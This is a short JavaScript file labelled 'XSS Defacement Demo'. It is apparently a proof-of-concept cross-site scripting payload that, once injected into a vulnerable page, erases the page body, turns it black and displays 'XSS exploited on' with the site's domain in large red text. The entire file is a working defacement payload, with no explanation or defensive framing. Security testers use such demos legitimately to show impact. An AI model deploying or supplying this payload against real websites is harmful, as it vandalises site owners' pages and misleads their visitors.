(function() {
  var pageTitle = "XSS Defacement Demo";
  var bgColor = "#000000";
  var fontColor = "#FF0000";
  var pageText = "XSS exploited on: " + document.domain;
  var imageUrl = "data:image/jpg;base64,";

  var overlay = document.createElement("div");
  overlay.style.textAlign = 'center';

  var txt = document.createElement("p");
  txt.style.font = 'normal normal bold 36px sans-serif';
  txt.style.color = fontColor;
  txt.innerHTML = pageText;
  overlay.appendChild(txt)

  var image = document.createElement("img");
  image.setAttribute("border", '0');
  image.setAttribute("src", imageUrl);
  overlay.appendChild(image);

  var footer = document.createElement("p");
  footer.style.font = 'italic normal normal 12px sans-serif';
  footer.style.color = '#DDDDDD';
  footer.innerHTML = pageTitle;
  overlay.appendChild(footer);

  document.title = pageTitle;
  document.body.innerHTML = '';
  document.body.style.background = bgColor;
  document.body.appendChild(overlay);
})();
